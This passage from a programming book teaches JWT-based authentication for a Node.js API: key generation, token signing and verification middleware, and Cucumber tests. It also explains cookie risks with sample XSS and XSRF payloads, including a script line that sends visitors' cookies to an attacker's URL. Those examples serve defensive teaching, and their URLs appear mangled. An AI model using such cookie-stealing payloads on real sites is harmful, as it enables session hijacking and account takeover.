<p class="mce-root">To generate the signature, the server must sign the header and claim set using algorithms specified in the<strong> JSON Web Algorithms</strong> (<strong>JWA</strong>) specification, which uses cryptographic keys as defined in the <strong>JSON Web Key</strong> (<strong>JWK</strong>) specification. The combination of the header, claim set, and signature becomes the <strong>JSON Web Signature </strong>(<strong>JWS</strong>).</p>
<p class="mce-root">However, the claim set can be base-64 decoded into plaintext and so the content of the token is not private. Therefore, we can encrypt our claim set and JOSE header using another algorithm defined in the JWA specification to ensure that the sensitive data is kept private. This encrypted JWT is then a <strong>JSON Web Encryption</strong> (<strong>JWE</strong>).</p>
<p class="mce-root">JWS and JWE are two different representations of a JWT. In other words, a JWT may have two flavors. In yet more words, the JWT must conform to either the JWS or JWE specification. For authentication purposes, the usual procedure is to sign a claim set to produce a JWS, and then encrypt the resulting JWS to produce a JWE. The JWS is said to be <em>nested</em> inside the JWE structure.</p>
<p class="mce-root">A JWT neither signed nor encrypted is said to be unsecured.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Responding with a token</h1>
                
            
            
                
<p>Now that we know how JWTs work, let's start implementing JWTs by first returning a JWT when the user successfully authenticates for the first time. For our simple use case, which does not require different permission levels, we'll simply include a single <kbd>sub</kbd> claim in the payload and set its value to the user's email.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Adding E2E Tests</h1>
                
            
            
                
<p>To get started, we will simply test that our <kbd>POST /login</kbd> endpoint returns with a JWT that contains the user's email as the payload. At the end of the <kbd>Login attaching a well-formed payload</kbd> scenario, add the following steps:</p>
<pre>And the response string should satisfy the regular expression /^[\w-]+\.[\w-]+\.[\w-.+\/=]*$/<br/>And the JWT payload should have a claim with name sub equal to context.userId</pre>
<p class="mce-root"/>
<p>The second step (<kbd>And the JWT payload should have a claim with name sub equal to context.email</kbd>) is undefined. To implement it, we must split the token up into three parts, header, payload, and signature; perform base64-decoding on the JWT payload; and then check that its <kbd>sub</kbd> property is equal to the expected user ID. Instead of implementing this logic ourselves, however, we can simply use the <kbd>jsonwebtoken</kbd> package. So let's add it as a normal dependency, as we will need it for the implementation code as well:</p>
<pre><strong>$ yarn add jsonwebtoken</strong></pre>
<p>Then, in <kbd>spec/cucumber/steps/response.js</kbd>, add the following step definition:</p>
<pre>import assert<strong>, { AssertionError }</strong> from 'assert';<br/><strong>import { decode } from 'jsonwebtoken';</strong><br/><br/><strong>Then(/^the JWT payload should have a claim with name (\w+) equal to context.([\w-]+)$/, function (claimName, contextPath) {</strong><br/><strong>  const decodedTokenPayload = decode(this.responsePayload);</strong><br/><strong>  if (decodedTokenPayload === null) {</strong><br/><strong>    throw new AssertionError();</strong><br/><strong>  }</strong><br/><strong>  assert.equal(decodedTokenPayload[claimName], objectPath.get(this, contextPath));</strong><br/><strong>});</strong></pre>
<p>Run the tests, and these two steps should fail.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Implementation</h1>
                
            
            
                
<p>As discussed previously, we will be using the RSA algorithm to generate the signature of our JWT, which requires the generation of private and public keys. Therefore, the first thing we must do is to generate the key pair. We can do this locally using the <kbd>ssh-keygen</kbd> command:</p>
<pre><strong>$ mkdir keys &amp;&amp; ssh-keygen -t rsa -b 4096 -f ./keys/key</strong></pre>
<p>Here, we are using the <kbd>-t</kbd> flag to specify that we want to generate an RSA key pair, and the <kbd>-b</kbd> flag to specify a key with a bit size of 4,096. Lastly, we use the <kbd>-f</kbd> flag to specify where we want the key to be stored. This will generate a private key that looks like this (truncated for brevity):</p>
<pre>-----BEGIN RSA PRIVATE KEY-----<br/>MIIJKAIBAAKCAgEAsTwK1Tireh3TVaJ66yUEAtLPP5tNuqwZW/kA64t7hgIRVKee<br/>1WjbKLcHIJcAcioHJnqME96M+YRaj/xvlIFSwIbY1CRPgRkqH7kHs6mnrOIvmiRT<br/>...<br/>...<br/>/cH3z0iGJh6WPrrw/xhil4VQ7UUSrD/4GC64r1sFS9wZ6d+PHPtcmlbkbWVQb/it<br/>2goH/g6WLIKABZNz2uWxmEnT7wOO+++tIPL8q4u1p9pabuO8tsgHX4Tl6O4=<br/>-----END RSA PRIVATE KEY-----</pre>
<p>It will also generate a public key that looks like this (truncated for brevity):</p>
<pre>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAA....7j7CyQ== username@hostname</pre>
<p>However, the <kbd>jsonwebtoken</kbd> package expects our RSA key to be PEM-encoded, and thus we must perform one more step to export the public key as an encoded PEM file:</p>
<pre><strong>$ ssh-keygen -f ./keys/key.pub -e -m pem &gt; ./keys/key.pub.pem</strong></pre>
<p>This will produce a key similar to the following (truncated for brevity):</p>
<pre>-----BEGIN RSA PUBLIC KEY-----<br/>MIICCgKCAgEAsTwK1Tireh3TVaJ66yUEAtLPP5tNuqwZW/kA64t7hgIRVKee1Wjb<br/>KLcHIJcAcioHJnqME96M+YRaj/xvlIFSwIbY1CRPgRkqH7kHs6mnrOIvmiRTPxSO<br/>...<br/>XjxHHzaebcsy1ccp3cUHP2/3WOAz35x1UdFvYwQ/Qjh9Ud1Yoe4+wskCAwEAAQ==<br/>-----END RSA PUBLIC KEY-----</pre>
<p>Now, we don't want to commit these key files into the history of our repository, for several reasons:</p>
<ul>
<li>Anyone with access to the repository will be able to get a copy of the keys (most importantly the private key), and be able to impersonate the real server. The private key should be known by as few parties as possible; not even the developers should need to know the production keys. The only people who need to know are the system administrators who manage the server.</li>
<li>If our keys are hardcoded into the code, then if we want to change these keys, we'd have to update the code, make a commit to the repository, and redeploy the entire application.</li>
</ul>
<p>So, what's a better alternative?</p>
<p>The most secure alternative is to use a <strong>Trusted Platform Module</strong> (<strong>TPM</strong>), which is a microcontroller (a computer chip) that is embedded into the motherboard of the server and allows you to securely store cryptographic keys. If you encrypt your development machine, the key it uses to encrypt and decrypt your machine is stored in the TPM. Similarly, you can use a <strong>Hardware Security Module</strong> (<strong>HSM</strong>), which is similar to a TPM, but instead of being embedded into the motherboard, is a removable external device.</p>
<p>However, using a TPM and HSM are not a viable option for most cloud servers. Therefore, the next best thing is to store the keys as environment variables. However, our keys span across multiple lines; how do we define multi-line environment variables?</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Multiline environment variables</h1>
                
            
            
                
<p>At the moment, we are using the <kbd>dotenv-cli</kbd> package to load our environment variables when running our application, which supports multi-line variables as long as you enclose the variable in double quotes (<kbd>"</kbd>) and replacing the newline characters with <kbd>\n</kbd>. Therefore, we can define our keys by adding the following entries (truncated for brevity) into our <kbd>.env</kbd>, <kbd>.env.example</kbd>, <kbd>test.env</kbd>, and <kbd>test.env.example</kbd> files:</p>
<pre>PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----<strong>\n</strong>MIIJKAIBAAKCAgEAsTwK1Tireh3TVaJ66yUEAtLPP5tNuqwZW/kA64t7hgIRVKee<strong>\n</strong>1WjbKLcHIJcAcioHJnqME96M+YRaj/xvlIFSwIbY1CRPgRkqH7kHs6mnrOIvmiRT<strong>\n</strong>PxSOtzy........tsgHX4Tl6O4=<strong>\n</strong>-----END RSA PRIVATE KEY-----"<br/>PUBLIC_KEY="-----BEGIN RSA PUBLIC KEY-----<strong>\n</strong>MIICCgKCAgEAsTwK1Tireh3TVaJ66yUEAtLPP5tNuqwZW/kA64t7hgIRVKee1Wjb<strong>\n</strong>KLcHIJcAcioHJnqME96M+YRaj/xvlIFSwIbY1CRPgRkqH7kHs6mnrOIvmiRTPxSO<strong>\n</strong>tzydJxN........+wskCAwEAAQ==<strong>\n</strong>-----END RSA PUBLIC KEY-----"</pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Generating the token</h1>
                
            
            
                
<p>Then, in <kbd>src/index.js</kbd>, import the <kbd>sign</kbd> method from the <kbd>jsonwebtoken</kbd> package and pass it down to the engine through the handlers. Then, update the engine function to return a signed JWT when a user is found with those credentials. Note that we are using the private key, stored at <kbd>process.env.PRIVATE_KEY</kbd>, to sign the token:</p>
<pre>function loginUser(req, db, validator, ValidationError<strong>, sign</strong>) {<br/>  ...<br/>  return client.search( ... )<br/>    .then((res) =&gt; {<br/>      if (res.hits.total &gt; 0) {<br/><strong>        const payload = { sub: res.hits.hits[0]._id };</strong><br/><strong>        const options = { algorithm: 'RS512' };</strong><br/><strong>        const token = sign(payload, process.env.PRIVATE_KEY, options);</strong><br/><strong>        return token;</strong><br/>      }<br/>      return Promise.reject(new Error('Not Found'));<br/>    });<br/>}</pre>
<p>Now, run our tests again and they should all pass.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Attaching the token</h1>
                
            
            
                
<p>We are now providing the client with a token they can use in place of their email/password, but how should they attach it to subsequent requests? Generally, there are five ways of attaching information to an HTTP request:</p>
<ul>
<li>As a URL parameter</li>
<li>As a query string</li>
<li>Inside the request body</li>
<li>As an HTTP cookie</li>
<li>As a header field</li>
</ul>
<p>The URL parameter is used for routing and it makes no sense to attach a digest there. Query strings are for things related to the query, such as setting the <kbd>limit</kbd> to limit the number of results returned in our search endpoint; it also makes no sense to attach information unrelated to the query here. As for the request body; we can't always have the digest in the request body, as some endpoints, such as Update Profile, use the request body to carry the payload. This leaves us with using a cookie or a header field.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">HTTP cookies</h1>
                
            
            
                
<p>An HTTP cookie (such as a web cookie or browser cookie) is a very simple dictionary/key-value store that a server can send to the client. It is sent by the server using the <kbd>Set-Cookie</kbd> header. For example, a <kbd>Set-Cookie</kbd> header may look like this:</p>
<pre>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Expires=&lt;date&gt;</pre>
<p>Multiple <kbd>Set-Cookie</kbd> headers can be sent in the same response message to compose the key-value store.</p>
<p>What's special about cookies is the fact that most browser clients will automatically send this key-value store back with each subsequent request, this time inside a <kbd>Cookie</kbd> header:</p>
<pre>Cookie: name1=value1; name2=value2</pre>
<p>Therefore, if we use a cookie to store the user's session ID in the browser, it'll allow the server to determine whether the request comes from the same client, because it will have the same session ID in the cookie.</p>
<p>The <kbd>Domain</kbd> directive of the cookie determines which domain (or subdomain) the client will set the <kbd>Cookie</kbd> header for. For instance, a cookie set by <kbd>abc.xyz</kbd> would only be sent back by the client for requests to <kbd>abc.xyz</kbd>, but not if the request is going to <kbd>foo.bar</kbd>.</p>
<p>Although cookies sound like a great idea, there are many disadvantages of using cookies, especially if we are dealing with cross-domain and CORS. Because cookies only work for that domain (or its subdomains), they are unable to authenticate with a related service if it is under a different domain. For example, when our platform expands from a simple user directory (deployed at <kbd>hobnob.social</kbd>) to, say, a event organization application (<kbd>hobnob.events</kbd>), and we want to let users who have logged in to <kbd>hobnob.social</kbd> also be automatically logged in to <kbd>hobnob.events</kbd>; this cannot be done using cookies as the cookies are set by a different domain.</p>
<p>Cookies are also more convenient only for browsers; having to manage cookies for non-browser clients is more of a hassle.</p>
<p>Furthermore, cookies are also vulnerable to <strong>Cross-Site Scripting</strong> (<strong>XSS</strong>) and <strong>Cross-Site Request Forgery</strong> (<strong>XSRF</strong>) attacks.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Cross-Site Scripting (XSS)</h1>
                
            
            
                
<p>XSS is where a malicious party injects some JavaScript into the page served by the server. For instance, if the server does not sanitize comments, then a malicious party can write the following comment:</p>
<pre>document.write('&lt;img src="img/collect.gif?cookie=' + document.cookie + '" /&gt;')</pre>
<p><kbd>document.cookie</kbd> is a global property that contains all the cookies set for the current domain. Therefore, when the next visitor visits your site, they will output the value of <kbd>document.cookie</kbd> and send it as a query string to <kbd>some.malicious.endpoint</kbd>. Once the malicious party has obtained the visitor's session IDs or tokens from their cookies, they will be able to impersonate that user.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Cross-Site Request Forgery (XSRF)</h1>
                
            
            
                
<p>With XSRF, the malicious party will attempt to send a request to the target application without the victim's knowledge. For example, the malicious party might have a website at <kbd>malicious.com</kbd>, and contains an <kbd>img</kbd> tag with the following definition:</p>
<pre>&lt;img src="img/?newPassword=foobar"&gt;</pre>
<p>Now, when the victim visits <kbd>malicious.com</kbd>, their browser will send a <kbd>GET</kbd> request to <kbd>http://target.app/change-password/?newPassword=foobar</kbd>, along with any cookies for that domain. Therefore, if the user is already authenticated in another browser tab, then this <kbd>GET</kbd> request would be received as if it was initiated by the user.</p>
<p>Cross-Site Scripting (XSS) is one of the OWASP Foundation's Top 10 Application Security Risks. You can read more about XSS on OWASP's website (<a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)</a>). Similarly, XSRF also has a page on OWASP (<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)</a>)</p>


            

            
        
    

        

                            
                    <h1 class="header-title">HTTP headers</h1>
                
            
            
                
<p>Because using cookies is less secure, especially for browser clients, and because it requires much more work for us to secure our API, we should not store and send back our token using cookies. Instead, we should store the token using one of the modern web storage APIs (<kbd>sessionStorage</kbd> or <kbd>localStorage</kbd>), and send it back using HTTP header fields.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">The Authorization header</h1>
                
            
            
                
<p>So, which HTTP header should we use? The common convention is to use the <kbd>Authorization</kbd> header, which has the following syntax:</p>
<pre>Authorization: &lt;type&gt; &lt;credentials&gt;</pre>
<p>The <kbd>type</kbd> is the <strong>authentication type</strong>, and the <kbd>credentials</kbd> are a representation of the user's credentials. There are many types of authentication schemes supported, such as <kbd>Basic</kbd>, <kbd>Bearer</kbd>, <kbd>Digest</kbd>, <kbd>Negotiate</kbd>, and <kbd>OAuth</kbd>, plus many more. The most common schemes are <kbd>Basic</kbd> and <kbd>Bearer</kbd>.</p>
<p class="mce-root"/>
<p>The <strong>Internet Assigned Numbers Authority</strong> (<strong>IANA</strong>) keeps a list of valid authentication schemes in its registry at <a href="http://www.iana.org/assignments/http-authschemes/http-authschemes.xhtml">iana.org/assignments/http-authschemes/http-authschemes.xhtml</a>.</p>
<p>The <kbd>Basic</kbd> scheme sends the credentials as a username/password pair separated by a colon (for example, <kbd>username:password</kbd>), which are Base64-encoded. It is also the most primitive and insecure form of authentication scheme, as the usernames and passwords are transmitted as plaintext.</p>
<p>Instead, we will use the <kbd>Bearer</kbd> scheme, where the credential is the token itself:</p>
<pre>Authorization: Bearer eyJhbGciOiJSUzUxMiIsInR5cCI6I...2ufQdDkg</pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Writing tests</h1>
                
            
            
                
<p>Now that we have decided to attach our token using the <kbd>Authorization</kbd> header with the <kbd>Bearer</kbd> scheme, our next action is to write the tests for this authentication system. For our use cases, let's say that all endpoints that alter a user's document (that is, all <kbd>POST</kbd>, <kbd>PATCH</kbd>, and <kbd>PUT</kbd> requests except <kbd>/login</kbd>) will require a token where the <kbd>sub</kbd> property matches the ID of the user.</p>
<p>As always, we begin development by writing tests. Let's start with the Delete User endpoint, which should respond with the following:</p>
<ul>
<li><kbd>200 OK</kbd> if the <kbd>Authorization</kbd> header is set to a well-formed credential (for example, it has the structure <kbd>username:bcrypt-digest</kbd>. We will verify whether these credentials correspond with a real user in the next step; right now, we just care whether it has the correct structure.)</li>
<li><kbd>400 Bad Request</kbd> if the <kbd>Authorization</kbd> header is set but its value is not well-formed.</li>
<li><kbd>401 Unauthorized</kbd> if the <kbd>Authorization</kbd> header is not set at all, or if the credentials do not match the specified user's.</li>
<li><kbd>403 Forbidden</kbd> if the user is trying to delete another user.</li>
<li><kbd>404 Not Found</kbd> if the user to be deleted cannot be found.</li>
</ul>
<p class="mce-root"/>
<p class="mce-root"/>


            

            
        
    

        

                            
                    <h1 class="header-title">Features and scenarios</h1>
                
            
            
                
<p>We must modify our existing E2E tests for Delete User to include these new scenarios; the end result may look something like this:</p>
<p class="mce-root"/>
<pre>Feature: Delete User by ID<br/><br/>  Clients should be able to send a request to our API in order to delete a user.<br/><br/>  Background: Create two Users and logs in with the first user's account<br/><br/>    Given 2 new users are created with random password and email<br/>    And the client creates a POST request to /login<br/>    And attaches a valid Login payload<br/>    And sends the request<br/>    And saves the response text in the context under token<br/><br/>  Scenario Outline: Wrong Authorization Header Scheme<br/><br/>    When the client creates a DELETE request to /users/:userId<br/>    And set the HTTP header field "Authorization" to "&lt;header&gt;"<br/>    And sends the request<br/>    Then our API should respond with a 400 HTTP status code<br/>    And the payload of the response should be a JSON object<br/>    And contains a message property which says "The Authorization header should use the Bearer scheme"<br/><br/>    Examples:<br/><br/>    | header                |<br/>    | Basic e@ma.il:hunter2 |<br/><br/>  Scenario Outline: Invalid Token Format<br/><br/>    When the client creates a DELETE request to /users/:userId<br/>    And set the HTTP header field "Authorization" to "Bearer &lt;token&gt;"<br/>    And sends the request<br/>    Then our API should respond with a 400 HTTP status code<br/>    And the payload of the response should be a JSON object<br/>    And contains a message property which says "The credentials used in the Authorization header should be a valid bcrypt digest"<br/><br/>    Examples:<br/><br/>    | token                                                        |<br/>    |                                                              |<br/>    | 6g3$d21"dfG9),Ol;UD6^UG4D£SWerCSfgiJH323£!AzxDCftg7yhjYTEESF |<br/>    | $2a$10$BZze4nPsa1D8AlCue76.sec8Z/Wn5BoG4kXgPqoEfYXxZuD27PQta |<br/><br/>  Scenario: Delete Self with Token with Wrong Signature<br/><br/>    The user is trying to delete its own account, the token contains the correct payload, but the signature is wrong.<br/><br/>    When the client creates a DELETE request to /users/:userId<br/>    And sets the Authorization header to a token with wrong signature<br/>    And sends the request<br/>    Then our API should respond with a 400 HTTP status code<br/>    And the payload of the response should be a JSON object<br/>    And contains a message property which says "Invalid signature in token"<br/><br/>  Scenario: Delete Self<br/><br/>    When the client creates a DELETE request to /users/:userId<br/>    And sets the Authorization header to a valid token<br/>    And sends the request<br/>    Then our API should respond with a 200 HTTP status code<br/>    <br/>    When the client creates a GET request to /users/:userId<br/>    And sends the request<br/>    Then our API should respond with a 404 HTTP status code<br/><br/>  Scenario: Delete Non-existing User<br/><br/>    When the client creates a DELETE request to /users/:userId<br/>    And sets the Authorization header to a valid token<br/>    And sends the request<br/>    Then our API should respond with a 200 HTTP status code<br/><br/>    When the client creates a DELETE request to /users/:userId<br/>    And sets the Authorization header to a valid token<br/>    And sends the request<br/>    Then our API should respond with a 404 HTTP status code<br/><br/>  Scenario: Delete Different User<br/><br/>    A user can only delete him/herself. When trying to delete another user, it should return with 403 Forbidden.<br/><br/>    When the client creates a DELETE request to /users/:users.1.id<br/>    And sets the Authorization header to a valid token<br/>    And sends the request<br/>    Then our API should respond with a 403 HTTP status code<br/>    And the payload of the response should be a JSON object<br/>    And contains a message property which says "Permission Denied. Can only delete yourself, not other users."</pre>
<p>First, we changed the background of the tests to create two users instead of one; we do this so that, later on, we can test for the scenario where one user tries to delete another user. Furthermore, we are also logging in the user in the background and saving the authentication token returned into the context.</p>
<p>Then, we added some tests for the authorization header, ensuring its format is correct, its value looks well-formed, and the signature is valid. Lastly, we added tests that ensure that only the user can delete him/herself. If he/she tries to delete another user, it'll come back with a <kbd>403 Forbidden</kbd> error.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Implementation step definitions</h1>
                
            
            
                
<p>Then, in <kbd>spec/cucumber/steps/request.js</kbd>, implement the following step definition:</p>
<pre>When(/^set the HTTP header field (?:"|')?([\w-]+)(?:"|')? to (?:"|')?(.+)(?:"|')?$/, function (headerName, value) {<br/>  this.request.set(headerName, value);<br/>});<br/><br/>When(/^sets the Authorization header to a valid token$/, function () {<br/>  this.request.set('Authorization', `Bearer ${this.token}`);<br/>});<br/><br/>When(/^sets the Authorization header to a token with wrong signature$/, function () {<br/>  // Appending anything to the end of the signature will invalidate it<br/>  const tokenWithInvalidSignature = `${this.token}a`;<br/>  this.request.set('Authorization', `Bearer ${tokenWithInvalidSignature}`);<br/>});</pre>


            

            
        
    

        

                            
                    <h1 class="header-title">Verifying the digest in the request</h1>
                
            
            
                
<p>Now that we have added our tests, it's time to implement the feature. Since we know that we want to check the token for most requests, we should not define the token validation logic solely within the Delete User engine. Instead, we should abstract all the generic validation steps (for example, the token is a valid JWT, the signature is well-formed, and so on) into middleware.</p>
<p>To start, create a file at <kbd>src/middlewares/authenticate/index.js</kbd> with the following boilerplate:</p>
<pre>function authenticate (req, res, next) {}<br/>export default authenticate;</pre>
<p>First, we want to allow anyone to get a single user and search for users; therefore, when the request is a <kbd>GET</kbd> request, we don't need to validate the token. At the top of the authenticate function, add the following check:</p>
<pre>if (req.method === 'GET') { return next(); }</pre>
<p>Usually, before a browser sends a CORS request, it will send a <strong>preflight request</strong> that checks to see whether the CORS protocol is understood. This request uses the <kbd>OPTIONS</kbd> method, and thus we also don't need to validate the token for <kbd>OPTIONS</kbd> requests either:</p>
<pre>if (req.method === 'GET' <strong>|| req.method === 'OPTIONS'</strong>) { return next(); }</pre>
<p>Next, we also want unauthenticated users to be able to call the Create User and Login endpoints. Just below the previous line, add the following early return checks:</p>
<pre>if (req.method === 'POST' &amp;&amp; req.path === '/users') { return next(); }<br/>if (req.method === 'POST' &amp;&amp; req.path === '/login') { return next(); }</pre>
<p>For any other endpoints, an <kbd>Authorization</kbd> header is required. Therefore, we'll next check for the presence of the <kbd>Authorization</kbd> header. If the header is not set, then we will return with a <kbd>401 Unauthorizated</kbd> error:</p>
<pre>const authorization = req.get('Authorization');<br/><br/>if (authorization === undefined) {<br/>  res.status(401);<br/>  res.set('Content-Type', 'application/json');<br/>  return res.json({ message: 'The Authorization header must be set' });<br/>}</pre>
<p>Next, we check that the value of the Authorization is valid. First, we can use the following code to check that a scheme is specified and is set to the value <kbd>"Bearer"</kbd>:</p>
<pre>const [scheme, token] = authorization.split(' ');<br/>if (scheme !== 'Bearer') {<br/>  res.status(400);<br/>  res.set('Content-Type', 'application/json');<br/>  return res.json({ message: 'The Authorization header should use the Bearer scheme' });<br/>}</pre>
<p>Then, we will check that the token is a valid JWT. We do this by specifying a regular expression and checking that the token specified in the header conforms to this regular expression. This uses the <kbd>jsonwebtoken</kbd> library, so be sure to import it at the top:</p>
<pre>const jwtRegEx = /^[\w-]+\.[\w-]+\.[\w-.+/=]*$/;<br/><br/>// If no token was provided, or the token is not a valid JWT token, return with a 400<br/>if (!token || !jwtRegEx.test(token)) {<br/>  res.status(400);<br/>  res.set('Content-Type', 'application/json');<br/>  return res.json({ message: 'The credentials used in the Authorization header should be a valid bcrypt digest' });<br/>}</pre>
<p>We have done all the relatively resource-light tasks, and exits early if these base conditions are not met. In the last step for this middleware, we will actually use the verify method to check that the payload is a valid JSON object and that the signature is valid. If it is, then we will add a <kbd>user</kbd> property to the <kbd>req</kbd> object with the ID of the user:</p>
<pre>import { JsonWebTokenError, verify } from 'jsonwebtoken';<br/><br/>verify(token, process.env.PUBLIC_KEY, { algorithms: ['RS512'] }, (err, decodedToken) =&gt; {<br/>  if (err) {<br/>    if (err instanceof JsonWebTokenError &amp;&amp; err.message === 'invalid signature') {<br/>      res.status(400);<br/>      res.set('Content-Type', 'application/json');<br/>      return res.json({ message: 'Invalid signature in token' });<br/>    }<br/>    res.status(500);<br/>    res.set('Content-Type', 'application/json');<br/>    return res.json({ message: 'Internal Server Error' });<br/>  }<br/>  req.user = Object.assign({}, req.user, { id: decodedToken.sub });<br/>  return next();<br/>});</pre>
<p class="mce-root"/>
<p class="mce-root"/>
<p>To apply the middleware, add it inside <kbd>src/index.js</kbd> after all the other middlewares, but before the route definitions:</p>
<pre><strong>import authenticate from './middlewares/authenticate';</strong><br/>...<br/>app.use(bodyParser.json({ limit: 1e6 }));<br/><strong>app.use(authenticate);</strong><br/>app.get('/salt', ...);<br/>...</pre>
<p>However, we're not quite done yet. The middleware only validates the token, but it still doesn't prevent a user from deleting another user. To implement this, add the following lines to the top of the Delete User engine:</p>
<pre>if (req.params.userId !== req.user.id) {<br/> return Promise.reject(new Error('Forbidden'));<br/>}</pre>
<p>And in the Delete User handler, define an if block to catch the <kbd>Forbidden</kbd> error and return a <kbd>403 Forbidden</kbd> status code:</p>
<pre>function del(req, res) {<br/>  return engine(req)<br/>    .then(() =&gt; { ... })<br/>    .catch((err) =&gt; {<br/>      if (err.message === 'Not Found') { ... }<br/>      if (err.message === 'Forbidden') {<br/>        res.status(403);<br/>        res.set('Content-Type', 'application/json');<br/>        res.json({ message: 'Permission Denied. Can only delete yourself, not other users.' });<br/>        return err;<br/>      }<br/>      ...<br/>    })<br/>}</pre>
<p>If we run the E2E tests for the Delete User endpoint, they should all pass! Now, follow the same steps to add authentication and authorization logic to the Replace Profile and Update Profile endpoints. Start by updating the E2E tests, and then update the engine and handlers to handle scenarios where a user is trying to perform an operation they are not allowed to.</p>
<p>Also, update the unit and integration tests, add more tests if you feel it's necessary, and then commit your code to the remote repository.</p>
<p class="mce-root">If you get stuck, check out our implementation from the code bundle we've provided. Do this before moving on to the next chapter.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Next steps</h1>
                
            
            
                
<p class="mce-root">As we mentioned at the beginning of this chapter, the authentication/authorization scheme we have presented here is very basic, and you'll need to take further steps to truly secure it. Here, we will briefly cover some more measures you can implement to further improve the security of your API.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Preventing man-in-the-middle (MITM) attacks</h1>
                
            
            
                
<p class="mce-root">At the moment, we rely on the client to hash their password before sending it over the wire. We do this so that our clients don't have to trust our API server with their credentials. The digest is now effectively being used as a password.</p>
<p class="mce-root">However, any proxy servers which sits between our client and our server would be able to read the digest, and can authenticate using those "stolen" credentials and masquerade as our client.</p>
<p>Another issue is that although our API server is able to authenticate the client, the client has no way of verifying our server's identity. Again, proxy servers can masquerade as our API server and trick the client into sending sensitive information to them.</p>
<p>To only way to reliably prevent both of these issues is to implement <strong>end-to-end encryption</strong> (<strong>E2EE</strong>) of the connection using <strong>Hyper Text Transfer Protocol Secure</strong> (<strong>HTTPS</strong>), the secure version of HTTP. To use HTTPS, you'd need to set up an SSL/TLS certificate for your domain, and register that certificate with an established and reputable <strong>Certificate Authority</strong> (<strong>CA</strong>).</p>
<p>When a client wants to securely send an HTTP message (which may contain credentials) over HTTPS, they would ask the CA for our site's certificate, and encrypt the HTTP message using the certificate. Encryption obfuscates the message and prevents third parties from deciphering the message. Only the server has the key to decrypt this message, so even if there are malicious proxy servers intercepting the messages, they would not be able to understand it.</p>
<p>Read more about MITM attacks on OWASP's website at <a href="https://www.owasp.org/index.php/Man-in-the-middle_attack">owasp.org/index.php/Man-in-the-middle_attack</a>.</p>
<p>If you want to enable HTTPS on the API, the Linux Foundation provides a free CA called Let's Encrypt (<a href="https://letsencrypt.org/">letsencrypt.org</a>). It also provides a tool called Certbot (<a href="https://certbot.eff.org/">certbot.eff.org</a>), which enables you to automatically deploy Let's Encrypt certificates. Feel free to try it out!</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Encrypting digests</h1>
                
            
            
                
<p>Using our current scheme, the digests created by the client are stored directly in the database. Now, if hackers were to gain access to the database server, they would be able to authenticate as any user. Furthermore, since the attacker would have both the digest and salt, they could potentially brute-force a user's password.</p>
<p>One way to mitigate this issue is to use a <strong>pepper</strong>—a variation of a salt, with the following differences:</p>
<ul>
<li class="mce-root">The pepper is not public</li>
<li class="mce-root">The pepper is not stored in the database, but on another application server, so that the pepper is separate from the salt</li>
<li class="mce-root">The pepper may be a constant that's set in the application server as an environment variable</li>
</ul>
<p class="mce-root">Here's how the authentication method would work with the pepper: the client sends the salted password digest to the server, who hashes the digest again with the pepper and stores the double-hashed digest in the database.</p>
<p class="mce-root">Now, if a hacker were to gain access to the database server (but not the application code), he/she will have the password digest and salt, but since he/she does not know the pepper (or, better still, even of the existence of a pepper), he/she would not be able to use the digest to authenticate (because our server would hash it again, and the resulting hash would not match the digest we have in the database). Furthermore, the attacker won't be able to derive the original password, even if they spent the time and resources to brute-force it.</p>
<p class="mce-root"/>
<p class="mce-root">However, peppers are only useful if your application server is secure. If the secret pepper is ever known, it cannot be retracted, as all our passwords were hashed with the pepper; since hashing is a one-way process, we cannot regenerate all password hashes with a new pepper. The inability to rotate this secret pepper makes this type of pepper unmaintainable.</p>
<p class="mce-root">An alternative to this is to not re-hash the salted password digest, but use a reversible <strong>block cipher</strong> to reversibly encrypt the digests instead.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Block cipher</h1>
                
            
            
                
<p class="mce-root">A block cipher, an algorithm for <strong>symmetric-key encryption</strong>, takes two parameters—a <strong>plaintext</strong> and a <strong>key</strong>—and runs them through the algorithm to generate a <strong>ciphertext</strong>. The idea is to generate a seemingly random ciphertext so that the plaintext input cannot be deduced from the ciphertext (much like hashing):</p>
<pre>const ciphertext = encrypt(plaintext, key);</pre>
<p class="mce-root">However, unlike hashing, block ciphers are reversible; given the ciphertext and the key, the plaintext can be regenerated:</p>
<pre>const plaintext = decrypt(ciphertext, key);</pre>
<p class="mce-root">Using a block cipher on our digest instead of applying a pepper means that if our application server (and thus the pepper) was compromised, we can run a simple function on our database that decrypts the ciphertext back to the digest and re-encrypt it using a new key.</p>


            

            
        
    

        

                            
                    <h1 class="header-title">Exploring the Secure Remote Password (SRP) protocol</h1>
                
            
            
                
<p><strong>Secure Remote Password protocol</strong> (<strong>SRP</strong>) is an industry-standard protocol for password-based authentication and key exchange. Like our rudimentary scheme, the password never has to leave the client. It is able to securely authenticate a user even in the following situations:</p>
<ul>
<li>Attackers have complete knowledge of the protocol</li>
<li>Attackers have access to a large dictionary of commonly used passwords</li>
</ul>
<ul>
<li>Attackers can eavesdrop on all communications between client and server</li>
<li>Attackers can intercept, modify, and forge arbitrary messages between client and server</li>
<li>A mutually trusted third party is not available</li>
</ul>
<p>This list was extracted from SRP's official website (<a href="http://srp.stanford.edu/whatisit.html">srp.stanford.edu/whatisit.html</a>)</p>
